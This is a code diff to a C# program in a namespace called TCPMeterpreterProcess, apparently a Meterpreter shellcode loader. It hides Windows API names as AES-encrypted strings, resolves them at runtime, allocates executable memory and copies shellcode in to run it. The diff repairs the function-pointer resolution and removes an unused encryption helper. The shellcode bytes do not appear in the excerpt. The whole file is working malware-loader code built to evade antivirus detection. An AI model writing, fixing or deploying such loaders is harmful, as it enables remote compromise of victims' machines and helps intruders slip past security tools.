@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -17,6 +17,11 @@ namespace TCPMeterpreterProcess
             internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
             [DllImport("Kernel32")]
             internal static extern IntPtr LoadLibrary(string moduleName);
+            internal delegate UInt32 Virtual_Alloc(
+            UInt32 lpStartAddr,
+            UInt32 size,
+            UInt32 flAllocationType,
+            UInt32 flProtect);
         }
         internal delegate UInt32 Virtual_Alloc(
             UInt32 lpStartAddr,
@@ -46,13 +51,13 @@ namespace TCPMeterpreterProcess
                 string v = "YlnmzpP5550nqLxW+3wdNQ==";
                 string c = "AkJecKOgemBiLxROAtA9WA==";
                 string w = "cH9ouyrpylq2wwZqDlf5Uod4zw5Vx+OrGTO0iMg4ah8=";
-
-                string Encrypt_trva = AesEncrypt(Marshal.PtrToStringAnsi(Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(v, key))), key);
-                Virtual_Alloc va = (Virtual_Alloc)Marshal.GetDelegateForFunctionPointer(Marshal.StringToHGlobalAnsi(Encrypt_trva), typeof(Virtual_Alloc));
-                string Encrypt_trct = AesEncrypt(Marshal.PtrToStringAnsi(Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(c, key))), key);
-                string Encrypt_trwf = AesEncrypt(Marshal.PtrToStringAnsi(Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(w, key))), key);
-                Create_Thread ct = (Create_Thread)Marshal.GetDelegateForFunctionPointer(Marshal.StringToHGlobalAnsi(Encrypt_trct), typeof(Create_Thread));
-                Wait_ForSingle_Object wfoi = (Wait_ForSingle_Object)Marshal.GetDelegateForFunctionPointer(Marshal.StringToHGlobalAnsi(Encrypt_trwf), typeof(Wait_ForSingle_Object));
+                
+                IntPtr trva = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(v, key));
+                Virtual_Alloc va = (Virtual_Alloc)Marshal.GetDelegateForFunctionPointer(trva, typeof(Virtual_Alloc));
+                IntPtr trct = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(c, key));
+                IntPtr trwf = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(w, key));
+                Create_Thread ct = (Create_Thread)Marshal.GetDelegateForFunctionPointer(trct, typeof(Create_Thread));
+                Wait_ForSingle_Object wfoi = (Wait_ForSingle_Object)Marshal.GetDelegateForFunctionPointer(trwf, typeof(Wait_ForSingle_Object));
 
                 UInt32 mem = va(0, (UInt32)shellcode.Length, 0x1000, 0x40);
                 Marshal.Copy(shellcode, 0, (IntPtr)(mem), shellcode.Length);
@@ -72,22 +77,7 @@ namespace TCPMeterpreterProcess
 
             return data;
         }
-        private static string AesEncrypt(string str, string key)
-        {
-            if (string.IsNullOrEmpty(str)) return null;
-            Byte[] toEncryptArray = Encoding.UTF8.GetBytes(str);
 
-            RijndaelManaged rm = new RijndaelManaged
-            {
-                Key = Encoding.UTF8.GetBytes(key),
-                Mode = CipherMode.ECB,
-                Padding = PaddingMode.PKCS7
-            };
-
-            ICryptoTransform cTransform = rm.CreateEncryptor();
-            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
-            return Convert.ToBase64String(resultArray);
-        }
         private static string AesDecrypt(string str, string key)
         {
             if (string.IsNullOrEmpty(str)) return null;
@@ -129,7 +119,7 @@ namespace TCPMeterpreterProcess
         }
         public static byte[] HexStringToBytes(string hexString)
         {
-            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",", "");
+            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",","");
             if (hexString.Length % 2 != 0)
                 throw new ArgumentException();
             return Enumerable.Range(0, hexString.Length / 2)
